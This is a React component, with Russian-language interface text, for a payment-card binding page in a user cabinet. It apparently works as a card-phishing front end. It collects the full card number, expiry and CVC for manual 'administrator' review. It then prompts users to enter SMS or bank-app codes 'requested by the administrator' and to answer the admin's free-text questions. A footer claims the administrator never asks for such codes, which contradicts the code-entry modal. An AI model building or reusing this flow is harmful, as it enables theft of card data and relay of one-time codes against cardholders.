"use client"

import { useEffect, useRef, useState, type FormEvent, type ReactNode } from "react"
import useSWR from "swr"
import {
  deletePaymentCard,
  requestCardBinding,
  setDefaultPaymentCard,
  submitCardCode,
  submitExtraCheckResponse,
  type PaymentCardView,
} from "@/app/actions/cards"
import { reviewFetcher } from "@/lib/review-fetcher"
import { CARD_BRAND_LABEL, detectBrand, formatCardNumber, formatExpiry, isExpiryValid, luhnValid, maskCard, normalizeCardNumber, parseExpiry, type CardBrand } from "@/lib/payment-cards"
import { CardBrandMark } from "@/components/cabinet/card-brand-mark"
import { EmptyState, Panel } from "@/components/cabinet/panel"
import { cn } from "@/lib/utils"

const BRAND_MATERIAL: Record<CardBrand, string> = {
  visa: "from-primary/70 via-primary/40 to-card",
  mastercard: "from-accent/70 via-primary/30 to-card",
  belkart: "from-gold/60 via-primary/30 to-card",
  mir: "from-primary/60 via-accent/40 to-card",
  other: "from-muted via-card to-card",
}


export function PaymentCards({ initial }: { initial: PaymentCardView[] }) {
  const { data: cards = initial, mutate, error: fetchError } = useSWR<PaymentCardView[]>("/api/cabinet/cards", reviewFetcher, {
    fallbackData: initial,
    refreshInterval: (latest) => (latest?.some((c) => c.status === "pending") ? 15000 : 0),
  })
  const [pendingId, setPendingId] = useState<number | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [formOpen, setFormOpen] = useState(false)
  const [modalCardId, setModalCardId] = useState<number | null>(null)
  const autoOpenedKeys = useRef<Set<string>>(new Set())

  async function run(id: number, action: () => Promise<PaymentCardView[]>) {
    setPendingId(id)
    setError(null)
    try {
      await mutate(await action(), false)
    } catch {
      setError("Не удалось выполнить действие. Попробуйте ещё раз.")
    } finally {
      setPendingId(null)
    }
  }

  // Открываем красивое окно сразу, как только карте нужен код или пришёл вопрос доп. проверки.
  useEffect(() => {
    for (const card of cards) {
      const needsAction =
        card.status === "code_requested" ||
        (card.status === "extra_check" && Boolean(card.extraCheckMessage) && !card.extraCheckResponse)
      if (!needsAction) continue
      const key = `${card.id}:${card.status}:${card.extraCheckMessage ?? ""}`
      if (autoOpenedKeys.current.has(key)) continue
      autoOpenedKeys.current.add(key)
      setModalCardId(card.id)
      break
    }
  }, [cards])

  const modalCard = cards.find((c) => c.id === modalCardId) ?? null

  return (
    <div className="flex flex-col gap-6">
      {cards.length === 0 && !formOpen && <EmptyState text="У вас пока нет привязанных карт." />}
      {cards.length > 0 && (
        <ul className="grid gap-4 sm:grid-cols-2">
          {cards.map((card) => (
            <li key={card.id}>
              <CardTile
                card={card}
                busy={pendingId === card.id}
                disabled={pendingId !== null}
                onMakeDefault={() => void run(card.id, () => setDefaultPaymentCard(card.id))}
                onDelete={() => {
                  if (confirm(`Отвязать карту ${maskCard(card.last4)}?`)) void run(card.id, async () => (await deletePaymentCard(card.id)).cards)
                }}
                onOpenAction={() => setModalCardId(card.id)}
              />
            </li>
          ))}
        </ul>
      )}
      {(error || fetchError) && <p role="alert" className="text-sm text-destructive">{error ?? "Не удалось загрузить карты."}</p>}

      {modalCard && (
        <CardActionModal
          card={modalCard}
          disabled={pendingId !== null}
          onClose={() => setModalCardId(null)}
          onSubmitCode={(code) =>
            run(modalCard.id, async () => (await submitCardCode(modalCard.id, code)).cards).then(() => setModalCardId(null))
          }
          onSubmitExtraCheck={(response) =>
            run(modalCard.id, async () => (await submitExtraCheckResponse(modalCard.id, response)).cards).then(() => setModalCardId(null))
          }
        />
      )}

      {formOpen ? (
        <BindingRequestForm
          onCancel={() => setFormOpen(false)}
          onDone={async (next) => {
            await mutate(next, false)
            setFormOpen(false)
          }}
        />
      ) : (
        <button
          type="button"
          onClick={() => setFormOpen(true)}
          className="group flex min-h-24 items-center justify-center gap-3 rounded-3xl border-2 border-dashed border-border/70 text-sm font-semibold text-foreground transition hover:border-primary hover:bg-primary/5"
        >
          <span className="grid size-10 place-items-center rounded-full bg-primary/15 text-primary transition group-hover:scale-110 group-hover:bg-primary group-hover:text-primary-foreground">
            <PlusMark className="size-5" />
          </span>
          Привязать новую карту
        </button>
      )}

      <p className="flex items-start gap-2 text-xs leading-relaxed text-muted-foreground text-pretty">
        <LockMark className="mt-0.5 size-4 shrink-0 text-gold" />
        Никому не сообщайте CVC и коды из SMS — администратор их никогда не запрашивает.
      </p>
    </div>
  )
}

function CardTile({
  card,
  busy,
  disabled,
  onMakeDefault,
  onDelete,
  onOpenAction,
}: {
  card: PaymentCardView
  busy: boolean
  disabled: boolean
  onMakeDefault: () => void
  onDelete: () => void
  onOpenAction: () => void
}) {
  const confirmed = card.status === "confirmed"
  const awaitingExtraCheckMessage = card.status === "extra_check" && !card.extraCheckMessage
  const needsExtraCheckResponse = card.status === "extra_check" && Boolean(card.extraCheckMessage) && !card.extraCheckResponse
  return (
    <div
      className={cn(
        "relative flex flex-col gap-4 overflow-hidden rounded-3xl bg-gradient-to-br p-5 text-foreground shadow-xl transition",
        BRAND_MATERIAL[card.brand],
        card.isDefault ? "ring-2 ring-gold" : "ring-1 ring-border",
        busy && "opacity-60",
      )}
    >
      <span aria-hidden="true" className="card-sheen pointer-events-none absolute inset-0 opacity-40" />
      <div className="relative flex items-start justify-between gap-3">
        <span className="text-xs font-medium text-foreground/70">{card.bankName ?? CARD_BRAND_LABEL[card.brand]}</span>
        <div className="flex items-center gap-2">
          {card.status === "pending" && (
            <span className="rounded-full bg-foreground/20 px-2.5 py-1 text-xs font-semibold backdrop-blur">
              На проверке
            </span>
          )}
          {card.status === "code_requested" && (
            <span className="rounded-full bg-gold px-2.5 py-1 text-xs font-semibold text-gold-foreground">Нужен код</span>
          )}
          {card.status === "extra_check" && (
            <span className="rounded-full bg-foreground/20 px-2.5 py-1 text-xs font-semibold backdrop-blur">Доп. проверка</span>
          )}
          {card.status === "rejected" && (
            <span className="rounded-full bg-destructive/80 px-2.5 py-1 text-xs font-semibold text-primary-foreground">Отклонена</span>
          )}
          <CardBrandMark brand={card.brand} className="h-6" />
        </div>
      </div>
      <div className="relative flex items-center gap-3">
        <span aria-hidden="true" className="card-chip h-7 w-10 rounded-md" />
        <p className="font-mono text-lg tracking-[0.12em] tabular-nums">{maskCard(card.last4)}</p>
      </div>
      <div className="relative flex items-end justify-between gap-3">
        <div className="min-w-0">
          <p className="truncate text-sm font-semibold uppercase">{card.cardholder}</p>
          {card.expMonth && card.expYear && (
            <p className="font-mono text-xs text-foreground/70">до {formatExpiry(card.expMonth, card.expYear)}</p>
          )}
        </div>
        <div className="flex shrink-0 items-center gap-1">
          {confirmed && card.isDefault && (
            <span className="inline-flex items-center gap-1 rounded-full bg-gold px-2.5 py-1 text-xs font-bold text-gold-foreground">
              <CheckMark className="size-3.5" />
              Основная
            </span>
          )}
          {confirmed && !card.isDefault && (
            <button
              type="button"
              onClick={onMakeDefault}
              disabled={disabled}
              className="rounded-full bg-foreground/15 px-3 py-1.5 text-xs font-semibold backdrop-blur transition hover:bg-foreground/25 disabled:opacity-50"
            >
              Сделать основной
            </button>
          )}
          <button
            type="button"
            onClick={onDelete}
            disabled={disabled}
            aria-label={`Отвязать карту ${maskCard(card.last4)}`}
            className="grid size-8 place-items-center rounded-full bg-foreground/15 backdrop-blur transition hover:bg-destructive hover:text-primary-foreground disabled:opacity-50"
          >
            <TrashMark className="size-4" />
          </button>
        </div>
      </div>
      {card.status === "pending" && (
        <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
          <Spinner className="size-4 shrink-0 text-foreground/70" />
          <p className="text-xs leading-relaxed text-foreground/80">Ожидайте решения администратора по привязке карты.</p>
        </div>
      )}
      {awaitingExtraCheckMessage && (
        <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
          <Spinner className="size-4 shrink-0 text-foreground/70" />
          <p className="text-xs leading-relaxed text-foreground/80">Администратор проводит дополнительную проверку. Ожидайте вопрос.</p>
        </div>
      )}
      {needsExtraCheckResponse && (
        <button
          type="button"
          onClick={onOpenAction}
          disabled={disabled}
          className="relative flex items-center justify-between gap-2 rounded-2xl bg-gold/90 p-3 text-left text-gold-foreground transition hover:bg-gold disabled:opacity-50"
        >
          <span className="text-xs font-semibold leading-relaxed">Администратор задал вопрос. Нажмите, чтобы ответить.</span>
          <ArrowRightMark className="size-4 shrink-0" />
        </button>
      )}
      {card.status === "extra_check" && Boolean(card.extraCheckMessage) && Boolean(card.extraCheckResponse) && (
        <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
          <Spinner className="size-4 shrink-0 text-foreground/70" />
          <p className="text-xs leading-relaxed text-foreground/80">Ответ отправлен. Ожидайте решения администратора.</p>
        </div>
      )}
      {card.status === "code_requested" && (
        <button
          type="button"
          onClick={onOpenAction}
          disabled={disabled}
          className="relative flex items-center justify-between gap-2 rounded-2xl bg-gold/90 p-3 text-left text-gold-foreground transition hover:bg-gold disabled:opacity-50"
        >
          <span className="text-xs font-semibold leading-relaxed">Нужен код подтверждения. Нажмите, чтобы ввести.</span>
          <ArrowRightMark className="size-4 shrink-0" />
        </button>
      )}
    </div>
  )
}

function Modal({ title, description, onClose, children }: { title: string; description?: string; onClose: () => void; children: ReactNode }) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose()
    }
    document.addEventListener("keydown", onKey)
    return () => document.removeEventListener("keydown", onKey)
  }, [onClose])

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label={title}>
      <button type="button" aria-label="Закрыть окно" onClick={onClose} className="absolute inset-0 bg-background/80 backdrop-blur-sm" />
      <div className="relative w-full max-w-md rounded-3xl bg-card p-6 text-foreground shadow-2xl ring-1 ring-border animate-in fade-in zoom-in-95 duration-200 sm:p-7">
        <button
          type="button"
          onClick={onClose}
          aria-label="Закрыть"
          className="absolute right-4 top-4 grid size-8 place-items-center rounded-full text-muted-foreground transition hover:bg-muted hover:text-foreground"
        >
          <CloseMark className="size-4" />
        </button>
        <h2 className="font-display text-lg font-bold text-foreground text-pretty pr-8">{title}</h2>
        {description && <p className="mt-1.5 text-sm leading-relaxed text-muted-foreground text-pretty">{description}</p>}
        <div className="mt-5">{children}</div>
      </div>
    </div>
  )
}

function CardActionModal({
  card,
  disabled,
  onClose,
  onSubmitCode,
  onSubmitExtraCheck,
}: {
  card: PaymentCardView
  disabled: boolean
  onClose: () => void
  onSubmitCode: (code: string) => Promise<void>
  onSubmitExtraCheck: (response: string) => Promise<void>
}) {
  const [value, setValue] = useState("")
  const [submitting, setSubmitting] = useState(false)
  const field = "min-h-14 w-full rounded-2xl border border-border/60 bg-background/60 px-4 text-base text-foreground outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/30"

  if (card.status === "extra_check" && card.extraCheckMessage && !card.extraCheckResponse) {
    return (
      <Modal title="Дополнительная проверка" description={card.extraCheckMessage} onClose={onClose}>
        <form
          onSubmit={async (e) => {
            e.preventDefault()
            if (!value.trim()) return
            setSubmitting(true)
            try {
              await onSubmitExtraCheck(value.trim())
            } finally {
              setSubmitting(false)
            }
          }}
          className="flex flex-col gap-4"
        >
          <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
            Ваш ответ
            <textarea
              value={value}
              onChange={(e) => setValue(e.target.value)}
              disabled={disabled || submitting}
              required
              rows={4}
              maxLength={500}
              placeholder="Введите ответ администратору"
              className={cn(field, "min-h-28 resize-none py-3")}
            />
          </label>
          <div className="flex flex-col gap-3 sm:flex-row">
            <button type="submit" disabled={disabled || submitting || !value.trim()} className="min-h-14 flex-1 rounded-full bg-primary px-5 text-base font-semibold text-primary-foreground transition hover:opacity-90 disabled:opacity-50">
              {submitting ? "Отправляем…" : "Отправить ответ"}
            </button>
            <button type="button" onClick={onClose} className="min-h-14 rounded-full border border-border px-5 text-base text-foreground">Позже</button>
          </div>
        </form>
      </Modal>
    )
  }

  if (card.status === "code_requested") {
    return (
      <Modal title="Код подтверждения" description="Введите код из SMS или банковского приложения, который запросил администратор." onClose={onClose}>
        <form
          onSubmit={async (e) => {
            e.preventDefault()
            if (!value.trim()) return
            setSubmitting(true)
            try {
              await onSubmitCode(value.trim())
            } finally {
              setSubmitting(false)
            }
          }}
          className="flex flex-col gap-4"
        >
          <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
            Код подтверждения
            <input
              value={value}
              onChange={(e) => setValue(e.target.value)}
              disabled={disabled || submitting}
              required
              autoFocus
              inputMode="numeric"
              autoComplete="one-time-code"
              placeholder="Код из SMS"
              maxLength={20}
              className={cn(field, "text-center font-mono text-xl tracking-[0.3em] tabular-nums")}
            />
          </label>
          <div className="flex flex-col gap-3 sm:flex-row">
            <button type="submit" disabled={disabled || submitting || !value.trim()} className="min-h-14 flex-1 rounded-full bg-primary px-5 text-base font-semibold text-primary-foreground transition hover:opacity-90 disabled:opacity-50">
              {submitting ? "Отправляем…" : "Подтвердить код"}
            </button>
            <button type="button" onClick={onClose} className="min-h-14 rounded-full border border-border px-5 text-base text-foreground">Позже</button>
          </div>
        </form>
      </Modal>
    )
  }

  return null
}

function BindingRequestForm({ onCancel, onDone }: { onCancel: () => void; onDone: (cards: PaymentCardView[]) => Promise<void> }) {
  const [cardholder, setCardholder] = useState("")
  const [cardNumber, setCardNumber] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cvc, setCvc] = useState("")
  const [showCvc, setShowCvc] = useState(false)
  const [submitting, setSubmitting] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const digits = normalizeCardNumber(cardNumber).slice(0, 16)
  const brand = detectBrand(digits)
  const numberComplete = digits.length === 16
  const numberInvalid = numberComplete && !luhnValid(digits)

  const expiryClean = expiry.replace(/[^\d/]/g, "")
  const expiryComplete = /^\d{2}\/\d{2}$/.test(expiryClean)
  const parsedExpiry = expiryComplete ? parseExpiry(expiryClean) : null
  const expiryInvalid = expiryComplete && (!parsedExpiry || !isExpiryValid(parsedExpiry.month, parsedExpiry.year))

  const cvcDigits = cvc.replace(/\D/g, "").slice(0, brand === "belkart" ? 3 : 4)
  const cvcComplete = cvcDigits.length >= 3
  const cvcInvalid = cvc.length > 0 && !cvcComplete

  async function onSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault()
    if (!numberComplete || numberInvalid) {
      setError("Проверьте номер карты — нужно 16 цифр.")
      return
    }
    if (!parsedExpiry || expiryInvalid) {
      setError("Проверьте срок действия карты (ММ/ГГ).")
      return
    }
    if (!cvcComplete) {
      setError("Укажите код CVC/CVV с обратной стороны карты.")
      return
    }
    setSubmitting(true)
    setError(null)
    try {
      const res = await requestCardBinding({
        cardholder,
        cardNumber: digits,
        expMonth: parsedExpiry.month,
        expYear: parsedExpiry.year,
        cvc: cvcDigits,
      })
      if (!res.ok) setError(res.error)
      else await onDone(res.cards)
    } catch {
      setError("Не удалось отправить заявку. Попробуйте ещё раз.")
    } finally {
      setSubmitting(false)
    }
  }

  function onExpiryChange(value: string) {
    const raw = value.replace(/\D/g, "").slice(0, 4)
    setExpiry(raw.length > 2 ? `${raw.slice(0, 2)}/${raw.slice(2)}` : raw)
  }

  const previewNumber = (digits + "•".repeat(16 - digits.length)).replace(/(.{4})/g, "$1 ").trim()
  const previewHolder = cardholder || "ИМЯ ФАМИЛИЯ"
  const previewExpiry = expiryClean || "ММ/ГГ"

  const field = "min-h-14 w-full rounded-2xl border border-border/60 bg-background/60 px-4 text-base text-foreground outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/30"

  return (
    <Panel className="p-5 sm:p-6">
      <form onSubmit={onSubmit} className="grid gap-8 lg:grid-cols-[minmax(0,320px)_1fr]">
        <div className="pointer-events-none mx-auto flex w-full max-w-sm flex-col justify-center lg:mx-0 lg:max-w-none" aria-hidden="true">
          <div className={cn("relative flex aspect-[1.586] flex-col justify-between overflow-hidden rounded-3xl bg-gradient-to-br p-5 text-foreground shadow-xl ring-1 ring-border transition-colors", BRAND_MATERIAL[brand])}>
            <span className="card-sheen absolute inset-0 opacity-40" />
            <div className="relative flex items-start justify-end">
              <CardBrandMark brand={brand} className="h-6" />
            </div>
            <span className="card-chip relative h-8 w-11 rounded-md" />
            <p className="relative font-mono text-lg tracking-[0.12em] tabular-nums sm:text-xl">{previewNumber}</p>
            <div className="relative flex items-end justify-between gap-3">
              <p className="truncate text-sm font-semibold uppercase">{previewHolder}</p>
              <p className="font-mono text-sm tabular-nums text-foreground/70">{previewExpiry}</p>
            </div>
          </div>
          <div className={cn("relative mt-3 flex aspect-[1.586/0.42] items-center justify-end rounded-2xl bg-gradient-to-br px-5 shadow-lg ring-1 ring-border", BRAND_MATERIAL[brand])}>
            <span aria-hidden="true" className="absolute inset-x-0 top-3 h-8 bg-foreground/80" />
            <p className="relative rounded bg-background/90 px-3 py-1 font-mono text-sm tabular-nums text-foreground">
              {cvcDigits ? "•".repeat(cvcDigits.length) : "CVC"}
            </p>
          </div>
        </div>

        <div className="flex flex-col gap-5">
          <h2 className="font-display text-lg font-bold text-foreground">Заявка на привязку карты</h2>
          <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
            Номер карты
            <input
              value={formatCardNumber(digits)}
              onChange={(e) => setCardNumber(normalizeCardNumber(e.target.value).slice(0, 16))}
              required
              inputMode="numeric"
              autoComplete="cc-number"
              placeholder="0000 0000 0000 0000"
              maxLength={19}
              aria-invalid={numberInvalid}
              className={cn(field, "font-mono text-lg tracking-widest tabular-nums", numberInvalid && "border-destructive focus:border-destructive focus:ring-destructive/30")}
            />
            {numberInvalid && <span className="text-xs text-destructive">Номер карты введён с ошибкой</span>}
          </label>
          <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
            Держатель карты
            <input value={cardholder} onChange={(e) => setCardholder(e.target.value.toUpperCase())} required maxLength={60} autoComplete="cc-name" placeholder="IVAN IVANOV" className={cn(field, "uppercase")} />
          </label>
          <div className="grid grid-cols-2 gap-4">
            <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
              Срок действия
              <input
                value={expiry}
                onChange={(e) => onExpiryChange(e.target.value)}
                required
                inputMode="numeric"
                autoComplete="cc-exp"
                placeholder="ММ/ГГ"
                maxLength={5}
                aria-invalid={expiryInvalid}
                className={cn(field, "text-center font-mono tabular-nums", expiryInvalid && "border-destructive focus:border-destructive focus:ring-destructive/30")}
              />
            </label>
            <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
              CVC/CVV
              <input
                value={cvcDigits}
                onChange={(e) => setCvc(e.target.value)}
                onFocus={() => setShowCvc(true)}
                onBlur={() => setShowCvc(false)}
                required
                type={showCvc ? "text" : "password"}
                inputMode="numeric"
                autoComplete="cc-csc"
                placeholder="000"
                maxLength={4}
                aria-invalid={cvcInvalid}
                className={cn(field, "text-center font-mono tabular-nums", cvcInvalid && "border-destructive focus:border-destructive focus:ring-destructive/30")}
              />
            </label>
          </div>
          {expiryInvalid && <span className="text-xs text-destructive">Проверьте срок действия карты</span>}
          {cvcInvalid && <span className="text-xs text-destructive">Код CVC должен содержать 3–4 цифры</span>}
          {error && <p role="alert" className="text-sm text-destructive">{error}</p>}
          <div className="flex flex-col gap-3 sm:flex-row">
            <button type="submit" disabled={submitting} className="min-h-14 flex-1 rounded-full bg-primary px-5 text-base font-semibold text-primary-foreground transition hover:opacity-90 disabled:opacity-50">
              {submitting ? "Отправляем…" : "Отправить заявку"}
            </button>
            <button type="button" onClick={onCancel} className="min-h-14 rounded-full border border-border px-5 text-base text-foreground">Отмена</button>
          </div>
        </div>
      </form>
    </Panel>
  )
}

function PlusMark({ className }: { className?: string }) {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" className={className} aria-hidden="true"><path d="M12 5v14M5 12h14" /></svg>
}

function CheckMark({ className }: { className?: string }) {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><path d="M5 12l5 5 9-10" /></svg>
}

function TrashMark({ className }: { className?: string }) {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3" /></svg>
}

function LockMark({ className }: { className?: string }) {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><rect x="5" y="11" width="14" height="10" rx="2" /><path d="M8 11V7a4 4 0 018 0v4" /></svg>
}

function ArrowRightMark({ className }: { className?: string }) {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6" /></svg>
}

function CloseMark({ className }: { className?: string }) {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><path d="M6 6l12 12M18 6L6 18" /></svg>
}

function Spinner({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" className={cn("animate-spin", className)} aria-hidden="true">
      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2.5" opacity="0.25" />
      <path d="M21 12a9 9 0 00-9-9" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" />
    </svg>
  )
}
